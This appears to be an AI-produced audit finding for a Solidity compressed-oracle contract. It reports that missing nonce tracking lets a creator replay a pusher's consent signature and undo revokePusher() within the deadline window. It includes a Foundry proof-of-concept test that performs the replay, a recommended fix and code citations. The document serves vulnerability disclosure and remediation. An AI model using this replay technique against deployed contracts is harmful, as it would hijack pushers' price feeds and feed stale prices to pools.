I now have enough context to analyze the full vulnerability surface. Let me read the `OracleBase` contract to complete the picture before writing up.

### Title
`revokePusher()` is bypassable within the deadline window via signature replay in `allowPushers` — (File: `smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` accepts a pusher's EIP-191 consent signature bound to a `deadline` but carries **no nonce and no used-signature tracking**. After a pusher calls `revokePusher()` to clear their delegation, the creator can immediately replay the original, still-valid signature to re-establish `namespaceRemapping[pusher] = creator`, nullifying the revocation for the entire remaining deadline window. The code comment on line 189–191 explicitly acknowledges the deadline is "required" to prevent exactly this re-establishment, but the deadline only blocks replay *after* it expires — not within the window.

---

### Finding Description

`allowPushers` hashes `(block.chainid, address(this), deadline, pusher, msg.sender)` and recovers the pusher's address from the signature:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
namespaceRemapping[pusher] = msg.sender;
``` [1](#0-0) 

There is no nonce, no `mapping(bytes32 => bool) usedSignatures`, and no check that `namespaceRemapping[pusher]` was previously zero. The only guard is `_ensureDeadline(deadline)`, which passes as long as `block.timestamp <= deadline`. [2](#0-1) 

`revokePusher()` clears the mapping:

```solidity
namespaceRemapping[msg.sender] = address(0);
``` [3](#0-2) 

Because the signature tuple `(chainid, oracle, deadline, pusher, creator)` is identical before and after revocation, the creator can call `allowPushers` again with the exact same `deadline` and `signature` bytes, writing `namespaceRemapping[pusher] = creator` again. The revocation is silently undone.

The code comment on lines 186–191 states the deadline is "required" to prevent re-establishment after revocation, but this is incorrect: the deadline only prevents replay *after* it expires. During the window — which in practice is set to hours or days — the creator can replay the signature an unlimited number of times. [4](#0-3) 

---

### Impact Explanation

The `fallback` push path resolves the namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [5](#0-4) 

After the creator replays the signature, the pusher's every subsequent `fallback` push lands in `feedIdOf(creator, slot, pos)` instead of `feedIdOf(pusher, slot, pos)`. Any pool or `AnchoredPriceProvider` whose `baseFeedId` is `feedIdOf(pusher, slot, pos)` — the pusher's own namespace — will read a slot that is never updated, returning a stale `timestampMs = 0` or the last pre-revocation value. `_readLeg` in `AnchoredPriceProvider` treats a stale `refTime` as `ok = false` and halts quoting, but only if `MAX_REF_STALENESS` is configured tightly enough; a loosely configured provider will pass the stale price through to `_computeBidAsk` and on to the pool swap. [6](#0-5) 

The broken invariant is: **a pusher can always self-revoke their delegation**. The code comment explicitly claims the deadline enforces this, but it does not within the window.

---

### Likelihood Explanation

The trigger is a creator calling `allowPushers` a second time with the same arguments — a single, cheap, permissionless transaction. No special access is required beyond being the original creator who called `allowPushers` the first time. Deadlines in the test suite are set to `block.timestamp + 1 days`, giving a 24-hour replay window. Any creator who wants to retain a pusher's data stream against the pusher's will can do so trivially. [7](#0-6) 

---

### Recommendation

Track consumed signatures with a `mapping(bytes32 => bool) private _usedConsents` keyed on the full hash. Mark it `true` on first use and revert if already set:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(!_usedConsents[hash], ConsentAlreadyUsed());
require(pusher == ECDSA.recover(hash, signatures[i]));
_usedConsents[hash] = true;
namespaceRemapping[pusher] = msg.sender;
```

This ensures each pusher consent signature can establish delegation exactly once, making `revokePusher()` permanent until the pusher issues a fresh signature with a new deadline.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract ReplayRevokePoC is Test {
    CompressedOracleV1 oracle;
    uint256 constant CREATOR_KEY = 0xC0FFEE;
    uint256 constant PUSHER_KEY  = 0xBEEF;
    address creator;
    address pusher;

    function setUp() public {
        oracle  = new CompressedOracleV1(address(this), 0);
        creator = vm.addr(CREATOR_KEY);
        pusher  = vm.addr(PUSHER_KEY);
        vm.warp(1_700_000_000);
    }

    function testRevokeBypassedByReplay() public {
        uint256 deadline = block.timestamp + 1 days;

        // 1. Pusher signs consent once.
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // 2. Creator delegates pusher.
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator, "delegated");

        // 3. Pusher self-revokes.
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "revoked");

        // 4. Creator replays the SAME signature — revocation undone.
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);  // no revert
        assertEq(oracle.namespaceRemapping(pusher), creator, "re-delegated: revoke bypassed");

        // 5. Pusher's next push lands in creator's namespace, not their own.
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint48 raw  = uint48((uint48(1_000_000) << 16) | (uint48(3) << 8) | uint48(3));
        uint256 word = (uint256(tsMs) << 8) | uint256(uint8(0));
        word |= uint256(raw) << 208;
        vm.prank(pusher);
        (bool ok,) = address(oracle).call(abi.encodePacked(word));
        assertTrue(ok);

        // Creator namespace updated; pusher's own namespace stays zero (stale).
        assertGt(oracle.getOracleData(oracle.feedIdOf(creator, 0, 0)).price, 0,
                 "creator ns updated");
        assertEq(oracle.getOracleData(oracle.feedIdOf(pusher,  0, 0)).price, 0,
                 "pusher own ns stale — pool using feedIdOf(pusher,...) gets stale price");
    }
}
```

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-191)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L192-212)
```text
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-316)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```

**File:** smart-contracts-poc/contracts/AnchoredPriceProvider.sol (L277-295)
```text
    function _readLeg(bytes32 feedId)
        internal returns (uint256 mid, uint256 spreadBps, uint256 refTime, bool ok)
    {
        (mid, spreadBps, , refTime) = IPricedOracle(address(offchainOracle)).price(feedId, msg.sender);

        // Stale reference → not ok. Clamping to a stale anchor is the one false-safety case.
        if (_isStale(refTime, block.timestamp, MAX_REF_STALENESS)) return (mid, spreadBps, refTime, false);

        // Basic validity — mid positive, spreadBps not the stalled/off-hours marker (the Chainlink oracle
        // writes spreadBps = ORACLE_BPS when an RWA market is closed).
        if (mid == 0 || spreadBps >= ORACLE_BPS) return (mid, spreadBps, refTime, false);

        // Per-leg price guard.
        (uint128 guardMin, uint128 guardMax) = offchainOracle.priceGuard(feedId);
        guardMax = guardMax == 0 ? type(uint128).max : guardMax;
        if (mid < guardMin || mid > guardMax) return (mid, spreadBps, refTime, false);

        ok = true;
    }
```

**File:** smart-contracts-poc/test/oracles/compressed/CompressedOracle.t.sol (L397-418)
```text
    function testRevokePusherRestoresOwnNamespace() public {
        _allowPusher(block.timestamp + 1 days);
        assertEq(oracle.namespaceRemapping(pusher), creator, "precondition: mapped");

        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "mapping should clear");

        // after revocation the wallet pushes into its OWN namespace again
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint48 raw = _packRaw(750_000, 2, 2);
        vm.prank(pusher);
        (bool ok,) = address(oracle).call(_wordAt(1, 1, raw, tsMs));
        assertTrue(ok, "self push after revoke failed");

        assertEq(
            oracle.getOracleData(oracle.feedIdOf(pusher, 1, 1)).price,
            U64x32.decode(uint32(raw >> 16)),
            "post-revoke push should land in own namespace"
        );
        assertEq(oracle.getOracleData(oracle.feedIdOf(creator, 1, 1)).price, 0, "creator namespace must stay empty");
    }
```
